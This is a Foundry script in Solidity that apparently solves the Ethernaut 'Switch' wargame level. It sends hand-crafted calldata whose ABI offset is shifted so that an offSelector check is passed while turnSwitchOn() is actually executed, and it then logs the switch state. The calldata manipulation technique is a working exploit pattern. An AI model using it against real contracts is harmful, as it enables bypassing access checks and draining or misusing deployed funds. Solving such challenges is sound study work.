// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/Switch.sol";
import {Script, console} from "forge-std/Script.sol";

contract SwitchScript is Script{
    uint256 public deployer;
    Switch sw; 

    function setUp() public {
        deployer = vm.envUint("PRIVATE_KEY");
        // deployer = vm.envUint("ANVIL_PRIVATE_KEY_2");
        vm.startBroadcast(deployer);
        // sw = new Switch();
        sw = Switch(address(0x4e9d0924D3d267B5674F4d346089218489C5343c));

        vm.stopBroadcast();
    }

    function run() public {
        // deployer = vm.envUint("ANVIL_PRIVATE_KEY");
        vm.startBroadcast(deployer);

        // bytes4 offSelector0 = bytes4(keccak256("flipSwitch(bytes)"));
        // console.logBytes4(offSelector0);

        // bytes4 offSelector1 = bytes4(keccak256("turnSwitchOff()"));
        // console.logBytes4(offSelector1);

        // bytes4 offSelector2 = bytes4(keccak256("turnSwitchOn()"));
        // console.logBytes4(offSelector2);

// 0x30c13ade
// 0x0000000000000000000000000000000000000000000000000000000000000060
// 0x0000000000000000000000000000000000000000000000000000000000000000
// 0x20606e1500000000000000000000000000000000000000000000000000000000
// 0x0000000000000000000000000000000000000000000000000000000000000004
// 0x76227e1200000000000000000000000000000000000000000000000000000000

        bytes memory data = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        address(sw).call(data);
        bool k = sw.switchOn();
        console.log("[+] Switch Result: ", k);
        vm.stopBroadcast();
        
    }

}